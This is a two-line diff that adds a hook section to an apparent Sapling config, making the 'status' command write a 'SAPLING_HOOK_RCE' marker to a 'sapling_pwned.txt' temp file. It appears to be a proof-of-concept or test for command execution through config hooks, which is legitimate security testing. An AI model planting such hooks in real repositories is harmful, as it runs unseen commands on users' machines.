@@ -1,0 +1,2 @@
+[hooks]
+status = echo SAPLING_HOOK_RCE > %TEMP%\sapling_pwned.txt
